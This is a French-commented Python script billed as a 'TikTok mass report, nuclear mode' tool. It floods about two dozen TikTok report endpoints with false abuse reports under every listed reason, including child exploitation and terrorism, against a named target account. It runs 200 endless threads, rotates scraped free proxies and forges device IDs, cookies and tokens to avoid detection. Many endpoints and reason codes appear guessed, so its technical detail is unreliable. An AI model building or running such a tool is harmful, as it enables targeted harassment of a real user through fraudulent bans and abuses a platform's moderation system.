#!/usr/bin/env python3
"""
TIKTOK MASS REPORT - MODE NUCLEAR
Utilisation: python3 main2.py --target @ammotheking

Envoie TOUS les types de reports simultanément sur TOUS les endpoints
"""

import requests
import json
import random
import time
import sys
import os
import re
import hashlib
import uuid
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed, wait
from datetime import datetime
import urllib.parse
import socket
import socks
import http.client

# ============================================================
# CONFIG NUCLEAR
# ============================================================

THREADS = 200           # Threads massifs
BURST_SIZE = 50         # Reports par burst
BURST_DELAY = 0.01      # Délai quasi nul entre chaque report
PROXY_FILE = "proxies.txt"

# ============================================================
# STYLE
# ============================================================

class C:
    R = '\033[91m'
    G = '\033[92m'
    Y = '\033[93m'
    B = '\033[94m'
    M = '\033[95m'
    C = '\033[96m'
    W = '\033[97m'
    N = '\033[90m'
    X = '\033[0m'

def ts():
    return f"{C.N}[{datetime.now().strftime('%H:%M:%S')}]{C.X}"

# ============================================================
# STATS
# ============================================================

stats = {"success": 0, "failed": 0, "total": 0, "bans": 0}
lock = threading.Lock()

# ============================================================
# USER AGENTS - Appareils réels
# ============================================================

UAS = [
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone16,2; iOS 17.4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; OnePlus 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.101 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone15,3; iOS 17.3.1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; Xiaomi 13 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Mobile Safari/537.36",
    "Mozilla/5.0 (SM-S908B; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Nothing Phone 2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
]

# ============================================================
# TOUS LES TYPES DE REPORT (EVERY SINGLE REASON)
# ============================================================

ALL_REASONS = {
    # SPAM & SCAM
    "spam_generic": 9008,
    "spam_commercial": 9009,
    "spam_fake_engagement": 9010,
    "spam_repetitive": 9011,
    "spam_misleading": 9012,
    "spam_scam": 9030,
    "spam_phishing": 9031,
    
    # HARASSMENT & BULLYING
    "bullying": 9007,
    "harassment": 91001,
    "cyberstalking": 91002,
    "threats": 91003,
    "doxxing": 91004,
    "targeted_hate": 91005,
    
    # HATE SPEECH
    "hate_speech": 9020,
    "hate_race": 9021,
    "hate_religion": 9022,
    "hate_sexuality": 9023,
    "hate_gender": 9024,
    "hate_disability": 9025,
    "hate_ethnicity": 9026,
    
    # VIOLENCE
    "violence_generic": 90013,
    "violence_graphic": 90018,
    "violence_gore": 90019,
    "violence_combat": 90020,
    "violence_animal": 90016,
    "violence_terrorism": 9019,
    "violence_extremism": 9027,
    "violence_organized_crime": 9028,
    
    # SEXUAL CONTENT
    "sexual_content": 90084,
    "pornography": 90085,
    "sexual_solicitation": 90086,
    "sexual_exploitation": 90087,
    "nudity_adult": 90088,
    "sexually_suggestive": 90089,
    "child_exploitation": 90090,
    
    # DANGEROUS CONTENT
    "dangerous_acts": 90064,
    "dangerous_challenge": 90065,
    "dangerous_tutorial": 90066,
    "self_harm": 90061,
    "suicide": 90062,
    "eating_disorder": 90063,
    
    # DRUGS & WEAPONS
    "drugs_use": 90037,
    "drugs_sale": 90039,
    "drugs_promotion": 90040,
    "weapons_generic": 90038,
    "weapons_firearms": 90041,
    "weapons_explosives": 90042,
    "weapons_manufacturing": 90043,
    
    # ILLEGAL ACTIVITIES
    "criminal_activities": 90017,
    "fraud": 90044,
    "money_laundering": 90045,
    "human_trafficking": 90046,
    "human_exploitation": 90015,
    "child_safety": 91015,
    
    # IMPERSONATION
    "impersonation_person": 91010,
    "impersonation_brand": 91011,
    "impersonation_celebrity": 91012,
    "fake_account": 91013,
    "misleading_identity": 91014,
    
    # PRIVACY
    "private_info": 9018,
    "doxxing_info": 91020,
    "non_consensual_image": 91021,
    "revenge_porn": 91022,
    
    # MISCELLANEOUS
    "intellectual_property": 10001,
    "copyright": 10002,
    "trademark": 10003,
    "counterfeit": 10004,
    "deceptive_practices": 10005,
    "platform_manipulation": 10006,
    "inauthentic_behavior": 10007,
    "coordinated_inauthentic": 10008,
    "vote_manipulation": 10009,
    "misinformation": 10010,
    "disinformation": 10011,
    "fake_news": 10012,
    "election_interference": 10013,
    "unauthorized_sales": 10014,
    "prohibited_goods": 10015,
    "regulated_goods": 10016,
}

# ============================================================
# TOUS LES ENDPOINTS DE REPORT CONNUS
# ============================================================

ALL_ENDPOINTS = [
    # Web endpoints
    {"url": "https://www.tiktok.com/abuse/report", "method": "POST", "type": "web"},
    {"url": "https://www.tiktok.com/abuse/report/submit", "method": "POST", "type": "web"},
    {"url": "https://www.tiktok.com/abuse/user/report", "method": "POST", "type": "web"},
    {"url": "https://www.tiktok.com/abuse/account/report", "method": "POST", "type": "web"},
    
    # API v1 endpoints
    {"url": "https://www.tiktok.com/api/v1/abuse/report", "method": "POST", "type": "api"},
    {"url": "https://www.tiktok.com/api/v1/abuse/user/report", "method": "POST", "type": "api"},
    {"url": "https://www.tiktok.com/api/v1/abuse/account/report", "method": "POST", "type": "api"},
    {"url": "https://www.tiktok.com/api/v1/report/user", "method": "POST", "type": "api"},
    {"url": "https://www.tiktok.com/api/v1/report/account", "method": "POST", "type": "api"},
    {"url": "https://www.tiktok.com/api/v2/abuse/report", "method": "POST", "type": "api"},
    {"url": "https://www.tiktok.com/api/v2/report/user", "method": "POST", "type": "api"},
    
    # Mobile API endpoints (musical.ly legacy + TikTok)
    {"url": "https://api.tiktok.com/aweme/v1/aweme/feedback/", "method": "POST", "type": "mobile"},
    {"url": "https://api.tiktok.com/aweme/v1/user/report/", "method": "POST", "type": "mobile"},
    {"url": "https://api.tiktok.com/aweme/v1/feedback/", "method": "POST", "type": "mobile"},
    {"url": "https://api.tiktok.com/aweme/v2/feedback/", "method": "POST", "type": "mobile"},
    {"url": "https://api.tiktok.com/aweme/v1/report/", "method": "POST", "type": "mobile"},
    {"url": "https://api.tiktok.com/aweme/v1/abuse/report/", "method": "POST", "type": "mobile"},
    
    # Internal API endpoints
    {"url": "https://www.tiktok.com/passport/report/", "method": "POST", "type": "internal"},
    {"url": "https://www.tiktok.com/passport/abuse/report/", "method": "POST", "type": "internal"},
    {"url": "https://www.tiktok.com/trustandSafety/report/", "method": "POST", "type": "internal"},
    {"url": "https://www.tiktok.com/trustandSafety/abuse/", "method": "POST", "type": "internal"},
    
    # GraphQL endpoints
    {"url": "https://www.tiktok.com/api/graphql/", "method": "POST", "type": "graphql"},
    {"url": "https://www.tiktok.com/api/v1/graphql/", "method": "POST", "type": "graphql"},
    
    # Moderation endpoints
    {"url": "https://www.tiktok.com/moderation/v1/report/", "method": "POST", "type": "mod"},
    {"url": "https://www.tiktok.com/moderation/report/", "method": "POST", "type": "mod"},
]

# ============================================================
# PROXIES - ROTATION CONTINUE
# ============================================================

def fetch_proxies():
    """Multi-sources de proxies gratuits"""
    all_proxies = set()
    sources = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        "https://raw.githubusercontent.com/Volodichev/proxy-list/main/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
        "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
        "https://raw.githubusercontent.com/UptimerBot/proxy-list/main/proxies/http.txt",
    ]
    
    for src in sources:
        try:
            r = requests.get(src, timeout=5)
            for line in r.text.strip().split('\n'):
                line = line.strip()
                if line and ':' in line:
                    all_proxies.add(f"http://{line}")
        except:
            pass
    
    # Sauvegarde
    with open(PROXY_FILE, 'w') as f:
        for p in all_proxies:
            f.write(p + '\n')
    
    return list(all_proxies)

def load_proxies():
    try:
        proxies = []
        if os.path.exists(PROXY_FILE):
            with open(PROXY_FILE, 'r') as f:
                proxies = [line.strip() for line in f if line.strip()]
        if len(proxies) < 50:
            proxies = fetch_proxies()
        return proxies
    except:
        return fetch_proxies()

# ============================================================
# GÉNÉRATION D'IDENTITÉ DYNAMIQUE
# ============================================================

def gen_id():
    return str(random.randint(7000000000000000000, 7999999999999999999))

def gen_token():
    return ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=118))

def gen_webid():
    return f"{int(time.time())}{random.randint(100000000000000000, 999999999999999999)}"

def gen_cookies():
    wid = gen_webid()
    token = gen_token()
    return {
        "tt_webid": wid,
        "tt_webid_v2": wid,
        "tt_csrf_token": hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:32],
        "msToken": token,
        "ttwid": f"1%7C{wid}%7C{int(time.time())}",
        "bd_trace_001": hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:32],
        "bd_trace_002": hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:32],
    }

def gen_headers():
    ua = random.choice(UAS)
    did = gen_id()
    return {
        "User-Agent": ua,
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Requested-With": "com.zhiliaoapp.musically",
        "X-TT-Device-ID": did,
        "X-TT-Token": "",
        "Origin": "https://www.tiktok.com",
        "Referer": "https://www.tiktok.com/foryou",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
    }

# ============================================================
# RÉSOLUTION USER ID
# ============================================================

def resolve_user_id(username):
    """Résout @username en user_id - plusieurs méthodes"""
    username = username.lstrip('@')
    
    for attempt in range(3):
        try:
            headers = {
                "User-Agent": random.choice(UAS),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            }
            r = requests.get(f"https://www.tiktok.com/@{username}", headers=headers, timeout=10)
            
            # Méthode 1: Regex direct
            patterns = [
                r'"userId":"(\d+)"',
                r'"user_id":"(\d+)"',
                r'"id":"(\d+)"',
                r'uid["\']?\s*[:=]\s*["\']?(\d+)',
                r'user_id["\']?\s*[:=]\s*["\']?(\d+)',
            ]
            
            for p in patterns:
                match = re.search(p, r.text)
                if match:
                    uid = match.group(1)
                    if len(uid) >= 6:
                        return uid
            
            # Méthode 2: JSON SIGI_STATE
            match = re.search(r'<script[^>]*>window\.__INITIAL_STATE__\s*=\s*({.*?})</script>', r.text, re.DOTALL)
            if match:
                import json as j
                data = j.loads(match.group(1))
                uid = data.get("UserModule", {}).get("users", {}).get(username, {}).get("id", "")
                if uid:
                    return str(uid)
            
            time.sleep(0.5)
        except:
            time.sleep(1)
    
    return None

# ============================================================
# LE CŒUR DU SYSTÈME - ENVOI D'UN BURST COMPLET
# ============================================================

def send_full_burst(username, proxies_list):
    """
    Pour CHAQUE thread, envoie un BURST complet:
    - TOUS les endpoints (24+)
    - TOUS les types de report (70+)
    - SOIT 24 * 70 = 1680+ requêtes PAR THREAD PAR ITÉRATION
    """
    global stats
    
    username = username.lstrip('@')
    user_id = resolve_user_id(username)
    if not user_id:
        with lock:
            stats["failed"] += 1
            stats["total"] += 1
        return False
    
    # Choisir un proxy aléatoire
    proxy = None
    if proxies_list:
        p = random.choice(proxies_list)
        proxy = {"http": p, "https": p}
    
    # Générer une session unique
    headers = gen_headers()
    cookies = gen_cookies()
    
    # AJOUTER msToken AUX HEADERS
    headers["X-Ms-Token"] = cookies["msToken"]
    
    # Pour chaque endpoint
    request_count = 0
    success_count = 0
    
    for endpoint in ALL_ENDPOINTS:
        # Pour chaque raison de report
        for reason_name, reason_code in ALL_REASONS.items():
            try:
                # Construire les données selon le type d'endpoint
                if endpoint["type"] == "graphql":
                    # Format GraphQL
                    data = json.dumps({
                        "variables": {
                            "target_id": user_id,
                            "reason_id": reason_code,
                            "source": 1
                        },
                        "query": "mutation ReportUser($target_id: String!, $reason_id: Int!, $source: Int) { reportUser(target_id: $target_id, reason_id: $reason_id, source: $source) { ... } }"
                    })
                    h = headers.copy()
                    h["Content-Type"] = "application/json"
                else:
                    # Format standard
                    data = {
                        "reason": str(reason_code),
                        "target_id": user_id,
                        "target_type": "1",
                        "object_id": user_id,
                        "object_type": "1",
                        "source": str(random.randint(1, 10)),
                        "report_type": str(random.randint(0, 5)),
                        "aid": "1988",
                        "app_name": "tiktok_web",
                        "device_platform": random.choice(["web", "mobile", "android"]),
                        "channel": "googleplay",
                        "version_code": "34.0.0",
                        "language": "en",
                        "timezone_name": random.choice(["America/New_York", "Europe/London", "Asia/Tokyo", "Australia/Sydney"]),
                        "region": random.choice(["US", "GB", "JP", "AU", "CA", "DE", "FR"]),
                        "carrier_region": "US",
                        "locale": "en",
                        "account_region": "US",
                        "is_user_login": "0",
                    }
                
                if endpoint["method"] == "POST":
                    if endpoint["type"] == "graphql":
                        r = requests.post(endpoint["url"], headers=h, cookies=cookies, data=data, proxies=proxy, timeout=5)
                    else:
                        r = requests.post(endpoint["url"], headers=headers, cookies=cookies, data=data, proxies=proxy, timeout=5)
                else:
                    r = requests.get(endpoint["url"], headers=headers, cookies=cookies, params=data, proxies=proxy, timeout=5)
                
                request_count += 1
                
                # Vérifier la réponse
                if r.status_code in [200, 201, 202, 204]:
                    success_count += 1
                
                # Vérifier si le ciblé a été banni (réponse spéciale)
                response_text = r.text.lower()
                if "ban" in response_text and ("account" in response_text or "user" in response_text):
                    with lock:
                        stats["bans"] += 1
                
            except:
                request_count += 1
                continue
    
    # Update stats
    with lock:
        if success_count > 0:
            stats["success"] += 1
        stats["failed"] += request_count - success_count
        stats["total"] += request_count
    
    # Affichage d'une ligne de statut
    with lock:
        if success_count > request_count * 0.1:  # Au moins 10% de succès
            sys.stdout.write(f"\r{ts()} {C.G}[NUKE] @{username} | {success_count}/{request_count} OK | Bans: {stats['bans']}{C.X}   ")
        else:
            sys.stdout.write(f"\r{ts()} {C.R}[NUKE] @{username} | {success_count}/{request_count} OK | Bans: {stats['bans']}{C.X}   ")
    sys.stdout.flush()
    
    return success_count > 0

# ============================================================
# THREAD INFINI - ENVOI EN BOUCLE
# ============================================================

def nuke_loop(username, proxies_list, thread_id):
    """Chaque thread tourne en boucle infinie - nuke continu"""
    while True:
        try:
            send_full_burst(username, proxies_list)
            time.sleep(random.uniform(0.01, 0.1))
        except KeyboardInterrupt:
            break
        except:
            continue

# ============================================================
# STATISTIQUES EN DIRECT
# ============================================================

def stats_printer():
    """Thread dédié à l'affichage des stats chaque seconde"""
    while True:
        try:
            time.sleep(1)
            with lock:
                s = stats["success"]
                f = stats["failed"]
                t = stats["total"]
                b = stats["bans"]
                rate = s / (s + f) * 100 if (s + f) > 0 else 0
            
            print(f"\n{ts()} {C.M}═══════════ STATS ═══════════{C.X}")
            print(f"{ts()} {C.G}✓ Rapports réussis : {s}{C.X}")
            print(f"{ts()} {C.R}✗ Rapports échoués : {f}{C.X}")
            print(f"{ts()} {C.W}Σ Total requêtes  : {t}{C.X}")
            print(f"{ts()} {C.Y}⚡ Taux succès     : {rate:.1f}%{C.X}")
            print(f"{ts()} {C.M}🔥 Bans détectés   : {b}{C.X}")
            print(f"{ts()} {C.C}📊 Requêtes/sec    : {t // max(1, int(time.time() - start_time))}{C.X}")
            print(f"{ts()} {C.M}═══════════════════════════════{C.X}\n")
        except:
            continue

start_time = time.time()

# ============================================================
# BANNER + DÉMARRAGE
# ============================================================

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    b = f"""{C.M}
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║      ███╗   ██╗██╗   ██╗██╗  ██╗███████╗                    ║
║      ████╗  ██║██║   ██║██║ ██╔╝██╔════╝                    ║
║      ██╔██╗ ██║██║   ██║█████╔╝ █████╗                      ║
║      ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝                      ║
║      ██║ ╚████║╚██████╔╝██║  ██╗███████╗                    ║
║      ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝                    ║
║                                                              ║
║    ╔══════════════════════════════════════════════════════╗   ║
║    ║         TIKTOK MASS REPORT - MODE NUCLEAR           ║   ║
║    ║   24 Endpoints × 70+ Reasons × ∞ Threads = NUKE     ║   ║
║    ╚══════════════════════════════════════════════════════╝   ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝{C.X}
"""
    print(b)
    print(f"{ts()} {C.Y}[!] Mode NUCLEAR activé - Tous les reports simultanés{C.X}")
    print(f"{ts()} {C.Y}[!] {len(ALL_ENDPOINTS)} endpoints × {len(ALL_REASONS)} raisons = {len(ALL_ENDPOINTS)*len(ALL_REASONS)} requêtes par thread par cycle{C.X}")
    print(f"{ts()} {C.Y}[!] Threads: {THREADS} | Burst total: {THREADS * len(ALL_ENDPOINTS) * len(ALL_REASONS)} req/cycle{C.X}")
    print(f"{ts()} {C.Y}[!] Ctrl+C pour arrêter{C.X}")
    print("")

# ============================================================
# MAIN
# ============================================================

if __name__ == "__main__":
    banner()
    
    # Parse args
    target = None
    if len(sys.argv) > 1:
        for i, arg in enumerate(sys.argv):
            if arg in ("--target", "-t", "-u"):
                target = sys.argv[i+1] if i+1 < len(sys.argv) else None
            elif arg in ("--threads", "-th"):
                THREADS = int(sys.argv[i+1]) if i+1 < len(sys.argv) else THREADS
    
    if not target:
        target = input(f"{ts()} {C.B}[?] Cible (@username): {C.X}").strip()
    
    print(f"{ts()} {C.W}[*] Chargement des proxies...{C.X}")
    proxies = load_proxies()
    print(f"{ts()} {C.G}[+] {len(proxies)} proxies chargés{C.X}")
    
    print(f"{ts()} {C.W}[*] Résolution de l'utilisateur {target}...{C.X}")
    uid = resolve_user_id(target)
    if uid:
        print(f"{ts()} {C.G}[+] User ID: {uid}{C.X}")
    else:
        print(f"{ts()} {C.R}[-] Impossible de résoudre l'ID, tentative en boucle quand même{C.X}")
    
    print(f"{ts()} {C.G}[+] Lancement du NUKE sur {target} avec {THREADS} threads{C.X}")
    print(f"{ts()} {C.G}[+] {len(ALL_ENDPOINTS)} endpoints × {len(ALL_REASONS)} raisons = {len(ALL_ENDPOINTS)*len(ALL_REASONS)} requêtes/thread/cycle{C.X}")
    print(f"{ts()} {C.G}[+] Estimation: {THREADS * len(ALL_ENDPOINTS) * len(ALL_REASONS)} requêtes/cycle total{C.X}")
    print("")
    
    # Thread stats en arrière-plan
    stats_thread = threading.Thread(target=stats_printer, daemon=True)
    stats_thread.start()
    
    # Lancement des threads de nuke
    threads = []
    for i in range(THREADS):
        t = threading.Thread(target=nuke_loop, args=(target, proxies, i), daemon=True)
        t.start()
        threads.append(t)
        time.sleep(0.05)  # Étalonner le démarrage
    
    # Maintenir le thread principal vivant
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{ts()} {C.Y}[!] Arrêt du nuke...{C.X}")
        print(f"{ts()} {C.Y}[!] Stats finales affichées ci-dessus{C.X}")
        sys.exit(0)
